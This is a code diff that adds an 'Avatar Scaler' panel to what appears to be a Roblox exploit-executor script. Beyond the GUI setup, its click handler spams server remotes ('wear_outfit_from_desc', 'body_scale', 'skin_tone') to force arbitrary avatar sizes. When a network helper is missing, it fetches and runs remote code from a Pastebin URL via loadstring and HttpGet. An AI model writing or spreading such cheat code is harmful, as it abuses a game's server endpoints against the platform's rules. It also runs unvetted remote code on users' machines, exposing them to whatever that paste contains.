@@ -400,6 +400,163 @@ LtAntiSitBtn.MouseButton1Click:Connect(function()
 end)
 
 ----------
+-- ========== AVATAR SCALER TOOL ==========
+local ScalerFrame = Instance.new("Frame")
+ScalerFrame.Size = UDim2.new(1, -5, 0, 75)
+ScalerFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+ScalerFrame.BorderSizePixel = 0
+ScalerFrame.Parent = ToolsScroll
+
+local ScalerTitle = Instance.new("TextLabel")
+ScalerTitle.Size = UDim2.new(1, -10, 0, 20)
+ScalerTitle.Position = UDim2.new(0, 5, 0, 5)
+ScalerTitle.Text = "📏 Custom Avatar Scaler"
+ScalerTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
+ScalerTitle.Font = Enum.Font.SourceSansBold
+ScalerTitle.TextSize = 14
+ScalerTitle.TextXAlignment = Enum.TextXAlignment.Left
+ScalerTitle.BackgroundTransparency = 1
+ScalerTitle.Parent = ScalerFrame
+
+local HeightLabel = Instance.new("TextLabel")
+HeightLabel.Size = UDim2.new(0, 50, 0, 20)
+HeightLabel.Position = UDim2.new(0, 5, 0, 25)
+HeightLabel.Text = "Height:"
+HeightLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+HeightLabel.Font = Enum.Font.SourceSansBold
+HeightLabel.TextSize = 13
+HeightLabel.BackgroundTransparency = 1
+HeightLabel.Parent = ScalerFrame
+
+local HeightInput = Instance.new("TextBox")
+HeightInput.Size = UDim2.new(0.3, -10, 0, 20)
+HeightInput.Position = UDim2.new(0, 55, 0, 25)
+HeightInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
+HeightInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+HeightInput.Font = Enum.Font.Code
+HeightInput.TextSize = 13
+HeightInput.Text = "1"
+HeightInput.Parent = ScalerFrame
+
+local WidthLabel = Instance.new("TextLabel")
+WidthLabel.Size = UDim2.new(0, 50, 0, 20)
+WidthLabel.Position = UDim2.new(0, 5, 0, 50)
+WidthLabel.Text = "Width:"
+WidthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+WidthLabel.Font = Enum.Font.SourceSansBold
+WidthLabel.TextSize = 13
+WidthLabel.BackgroundTransparency = 1
+WidthLabel.Parent = ScalerFrame
+
+local WidthInput = Instance.new("TextBox")
+WidthInput.Size = UDim2.new(0.3, -10, 0, 20)
+WidthInput.Position = UDim2.new(0, 55, 0, 50)
+WidthInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
+WidthInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+WidthInput.Font = Enum.Font.Code
+WidthInput.TextSize = 13
+WidthInput.Text = "1"
+WidthInput.Parent = ScalerFrame
+
+local ApplyScaleBtn = Instance.new("TextButton")
+ApplyScaleBtn.Size = UDim2.new(0.4, 0, 0, 45)
+ApplyScaleBtn.Position = UDim2.new(0.6, -5, 0, 25)
+ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
+ApplyScaleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+ApplyScaleBtn.Font = Enum.Font.SourceSansBold
+ApplyScaleBtn.TextSize = 14
+ApplyScaleBtn.Text = "Apply Size"
+ApplyScaleBtn.BorderSizePixel = 0
+ApplyScaleBtn.Parent = ScalerFrame
+
+ApplyScaleBtn.MouseButton1Click:Connect(function()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return end
+
+    local success, description = pcall(function() return humanoid:GetAppliedDescription() end)
+    if not success or not description then return end
+
+    ApplyScaleBtn.Text = "Scanning..."
+    
+    -- Dynamically pull exactly what you are wearing right now
+    local outfitData = {}
+    local function getVal(prop)
+        local ok, val = pcall(function() return description[prop] end)
+        return (ok and val ~= nil) and val or nil
+    end
+
+    local hc = getVal("HeadColor")
+    if typeof(hc) == "Color3" then outfitData.SkinTone = {hc.R, hc.G, hc.B} end
+
+    local props = {"Face", "Shirt", "Pants", "GraphicTShirt", "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg", "IdleAnimation", "WalkAnimation", "RunAnimation", "JumpAnimation", "FallAnimation", "ClimbAnimation", "SwimAnimation", "BodyTypeScale", "ProportionScale", "HeadScale"}
+    for _, p in ipairs(props) do outfitData[p] = getVal(p) end
+
+    outfitData.Accessories = {}
+    pcall(function()
+        local accs = description:GetAccessories(true)
+        if accs then
+            for _, a in pairs(accs) do
+                table.insert(outfitData.Accessories, {
+                    AssetId = a.AssetId,
+                    IsLayered = a.IsLayered,
+                    AccessoryType = a.AccessoryType and tostring(a.AccessoryType):gsub("Enum.AccessoryType.", "") or a.AccessoryType
+                })
+            end
+        end
+    end)
+
+    -- INJECT CUSTOM SIZES
+    outfitData.HeightScale = tonumber(HeightInput.Text) or 1
+    outfitData.WidthScale = tonumber(WidthInput.Text) or 1
+
+    local payload = buildBatchPayload(outfitData)
+    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
+
+    if not Send then
+        ApplyScaleBtn.Text = "Loading Net..."
+        pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/GiEmv8Qf"))() end)
+        task.wait(1)
+        Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
+    end
+
+    if Send then
+        ApplyScaleBtn.Text = "Applying..."
+        task.spawn(function()
+            -- Push the outfit description to the server
+            for i = 1, 3 do Send("wear_outfit_from_desc", payload) task.wait(0.1) end
+            task.wait(0.2)
+            
+            if outfitData.SkinTone then 
+                pcall(function() 
+                    local c = Color3.new(outfitData.SkinTone[1], outfitData.SkinTone[2], outfitData.SkinTone[3]) 
+                    for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end 
+                end) 
+            end
+            
+            -- Push the actual scale remotes
+            for i=1,3 do Send("body_scale", "HeightScale", outfitData.HeightScale * 100) task.wait(0.1) end
+            for i=1,3 do Send("body_scale", "WidthScale", outfitData.WidthScale * 100) task.wait(0.1) end
+            if outfitData.BodyTypeScale then for i=1,3 do Send("body_scale", "BodyTypeScale", outfitData.BodyTypeScale * 100) task.wait(0.1) end end
+            if outfitData.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", outfitData.ProportionScale * 100) task.wait(0.1) end end
+
+            ApplyScaleBtn.Text = "Size Applied!"
+            ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+            task.wait(1.5)
+            ApplyScaleBtn.Text = "Apply Size"
+            ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
+        end)
+    else
+        ApplyScaleBtn.Text = "Net Error"
+        ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        task.wait(1.5)
+        ApplyScaleBtn.Text = "Apply Size"
+        ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
+    end
+end)
+
+------
 
 local SavedListLayout = Instance.new("UIListLayout")
 SavedListLayout.Parent = SavedScroll
